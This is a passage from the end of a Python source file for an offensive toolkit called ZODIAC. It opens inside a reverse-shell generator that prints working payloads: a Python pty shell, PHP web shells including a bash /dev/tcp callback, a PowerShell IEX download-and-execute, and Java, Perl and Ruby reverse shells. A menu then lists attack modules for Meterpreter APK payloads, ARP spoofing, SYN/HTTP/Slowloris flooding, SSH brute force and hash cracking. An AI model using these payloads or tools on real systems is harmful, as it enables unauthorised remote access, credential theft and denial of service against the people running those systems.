s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'{C.RS}""")
    print(f"{C.M}2. PHP Web Shell{C.RS}")
    print(f""" {C.BL}{C.BD}<?php system($_GET['cmd']); ?>
   or
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"); ?>
{C.RS}""")
    print(f"{C.M}3. PowerShell (Windows){C.RS}")
    print(f""" {C.BL}{C.BD}powershell -NoP -NonI -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/ps.ps1')"{C.RS}""")
    print(f"{C.M}4. Java Reverse Shell{C.RS}")
    print(f""" {C.BL}{C.BD}r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do \\$line 2>&5 >&5;done"])
p.waitFor(){C.RS}""")
    print(f"{C.M}5. Perl Reverse Shell{C.RS}")
    print(f""" {C.BL}{C.BD}perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}'{C.RS}""")
    print(f"{C.M}6. Ruby Reverse Shell{C.RS}")
    print(f""" {C.BL}{C.BD}ruby -rsocket -e 'c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'{C.RS}""")
    print(f"{C.G}{C.BD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RS}")
    pause()

# ---------- MAIN MENU ----------

MENU = {
    '1': ('🌐 RECONNAISSANCE', [
        ('01', 'NMAP Port Scanner', module_nmap_scan, 'Full port & service scan'),
        ('02', 'Subdomain Enumeration', module_subdomain_enum, 'Find subdomains'),
        ('03', 'DNS Enumeration', module_dns_enum, 'DNS records & zone transfer'),
        ('04', 'OSINT & WHOIS', module_osint, 'Information gathering'),
    ]),
    '2': ('💉 EXPLOITATION', [
        ('05', 'SQL Injection Scanner', module_sql_injection, 'sqlmap automation'),
        ('06', 'XSS Scanner', module_xss_scanner, 'Cross-site scripting detection'),
        ('07', 'Metasploit Launcher', module_metasploit, 'MSF console & payload gen'),
        ('08', 'Reverse Shell Generator', module_reverse_shell_gen, 'Multi-platform shells'),
    ]),
    '3': ('🌍 WEB ATTACK', [
        ('09', 'Directory Buster', module_dir_buster, 'Find hidden dirs/files'),
        ('10', 'WordPress Scanner', module_wordpress_scan, 'wpscan automation'),
    ]),
    '4': ('📱 ANDROID / MOBILE', [
        ('11', 'Android Payload Gen', module_android_payload, 'Meterpreter APK'),
        ('12', 'ADB Hacking Tools', module_adb_hacking, 'Android debug bridge'),
    ]),
    '5': ('⬆️ PRIVILEGE ESCALATION', [
        ('13', 'Linux Privesc Check', module_linux_privesc, 'Enumeration checks'),
        ('14', 'Auto Enum Scripts', module_enum_scripts, 'LinPEAS/LinEnum/LEG'),
    ]),
    '6': ('🌐 NETWORK ATTACKS', [
        ('15', 'Network Scanner', module_network_scanner, 'Live host discovery'),
        ('16', 'ARP Spoofing', module_arp_spoof, 'MITM (requires root)'),
    ]),
    '7': ('🔐 CRYPTO & HASHING', [
        ('17', 'Hash Cracker', module_hash_cracker, 'hashcat automation'),
    ]),
    '8': ('📶 WIRELESS', [
        ('18', 'WiFi Scanner', module_wifi_scan, 'Access point discovery'),
        ('19', 'MAC Changer', module_mac_changer, 'Spoof MAC address'),
    ]),
    '9': ('💥 STRESS TESTING', [
        ('20', 'Stress Test Tools', module_ddos_stress, 'SYN/HTTP/Slowloris'),
        ('21', 'SSH Brute Force', module_ssh_bruteforce, 'Hydra automation'),
    ]),
    '10': ('🔬 FORENSICS', [
        ('22', 'Forensics & Logs', module_forensics, 'Log analysis & memory'),
        ('23', 'Payload Generator', module_payloads, 'All-in-one payloads'),
    ]),
}

def print_main_menu():
    clear()
    print(f"{C.BG_B}{C.BL}{C.BD}")
    print(LOGO)
    print(f"{C.RS}{C.BL}{C.BD}")
    
    # Status bar
    w = os.get_terminal_size().columns - 4
    root_str = f"{C.BG_R} ROOT {C.RS}{C.BL}" if IS_ROOT else f"{C.BG_Y} USER {C.RS}{C.BL}"
    plat = "Android" if IS_ANDROID else "Linux"
    print(f"{C.BL}╔{'═'*(w+2)}╗{C.RS}")
    print(f"{C.BL}║{C.RS} {root_str} {C.C}{C.BD}{plat}{C.RS}{' '*(w-15)} {C.BL}║{C.RS}")
    print(f"{C.BL}║{C.RS} {C.BL}{C.BD}ZODIAC v3.0 — {len([m for cat in MENU.values() for m in cat[1]])} Modules Loaded{C.RS}{' '*(w-37)} {C.BL}║{C.RS}")
    print(f"{C.BL}╚{'═'*(w+2)}╝{C.RS}")
    
    print(f"\n{C.Y}{C.BD}    ┌─────────────────────────────────────────────┐{C.RS}")
    print(f"{C.Y}{C.BD}    │  {C.G}{C.BD}SELECT A CATEGORY:{C.RS}{C.Y}{C.BD}              │{C.RS}")
    print(f"{C.Y}{C.BD}    └─────────────────────────────────────────────┘{C.RS}\n")
    
    for key, (cat_name, items) in MENU.items():
        icon_border = f"{C.BL}┃{C.RS}"
        num_colored = f"{C.Y}{C.BD}{key}{C.RS}"
        name_colored = f"{C.C}{C.BD}{cat_name}{C.RS}"
        count = f"{C.DM}[{len(items)} tools]{C.RS}"
        print(f"    {icon_border}  [{num_colored}]  {name_colored}  {count}")
    
    print(f"\n{C.BL}{'═'*(w+4)}{C.RS}")
    print(f"\n    {icon_border}  [{C.R}{C.BD}00{C.RS}]  {C.R}{C.BD}ROOT MODE TOGGLE{C.RS}")
    print(f"    {icon_border}  [{C.R}{C.BD}0{C.RS}]   {C.R}{C.BD}EXIT ZODIAC{C.RS}")
    print(f"\n{C.BL}{'═'*(w+4)}{C.RS}")

def print_category_menu(cat_num, cat_name, items):
    clear()
    w = os.get_terminal_size().columns - 4
    print(f"{C.BG_B}{C.BL}{C.BD}")
    print(f"\n{C.BG_M}{C.BL}{C.BD}  {cat_name}  {C.RS}\n")
    print(f"{C.BL}╔{'═'*(w+2)}╗{C.RS}")
    print(f"{C.BL}║{C.RS} {C.Y}{C.BD}Select a module:{C.RS}{' '*(w-20)} {C.BL}║{C.RS}")
    print(f"{C.BL}╚{'═'*(w+2)}╝{C.RS}\n")
    
    for num, name, _, desc in items:
        print(f"  {C.Y}{C.BD}[{num}]{C.RS}  {C.G}{C.BD}{name}{C.RS}")
        print(f"       {C.BL}└─ {C.DM}{desc}{C.RS}")
    
    print(f"\n  {C.M}{C.BD}[b]{C.RS}  {C.M}Back to main menu{C.RS}")
    print(f"  {C.R}{C.BD}[0]{C.RS}  {C.R}Exit ZODIAC{C.RS}")
    print(f"\n{C.BL}{'═'*(w+4)}{C.RS}")

def main():
    # Handle Ctrl+C
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
    
    global IS_ROOT
    os.makedirs('output', exist_ok=True)
    
    while True:
        print_main_menu()
        cat_choice = input(f"\n {C.Y}{C.BD}Category → {C.RS}").strip()
        
        if cat_choice == '0':
            print(f"\n{C.R}{C.BD}[!] Exiting ZODIAC...{C.RS}")
            typing_effect(f"{C.C}The stars align... until next time, hacker.{C.RS}", 0.05)
            sys.exit(0)
        
        elif cat_choice == '00':
            if not IS_ROOT:
                print(f"\n{C.Y}[*] Attempting to switch to root...{C.RS}")
                os.system('sudo su -c "python3 zodiac.py"')
                sys.exit(0)
            else:
                print(f"\n{C.Y}[*] Already running as root{C.RS}")
                pause()
        
        elif cat_choice in MENU:
            cat_name, items = MENU[cat_choice]
            while True:
                print_category_menu(cat_choice, cat_name, items)
                mod_choice = input(f"\n {C.Y}{C.BD}Module → {C.RS}").strip().lower()
                
                if mod_choice == '0':
                    print(f"\n{C.R}{C.BD}[!] Exiting ZODIAC...{C.RS}")
                    sys.exit(0)
                elif mod_choice == 'b':
                    break
                
                # Find and run module
                for num, name, func, desc in items:
                    if mod_choice == num or mod_choice == num.lstrip('0'):
                        clear()
                        print(LOGO)
                        func()
                        break
                else:
                    print(f"\n{C.R}[!] Invalid choice{C.RS}")
                    pause()
        else:
            print(f"\n{C.R}[!] Invalid category{C.RS}")
            pause()

# ---------- FIRE UP ZODIAC ----------
if __name__ == '__main__':
    try:
        # Check requirements
        try:
            import colorama
        except ImportError:
            os.system('pip3 install colorama 2>/dev/null || pip install colorama 2>/dev/null')
        
        clear()
        typing_effect(f"{C.C}{C.BD}☠ INITIALIZING ZODIAC FRAMEWORK...{C.RS}", 0.02)
        time.sleep(0.5)
        typing_effect(f"{C.M}{C.BD}⚡ Loading cyber arsenal...{C.RS}", 0.02)
        time.sleep(0.3)
        check_root()
        main()
    except KeyboardInterrupt:
        print(f"\n{C.R}{C.BD}[!] ZODIAC terminated{C.RS}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C.R}{C.BD}[!] Error: {e}{C.RS}")
        sys.exit(1)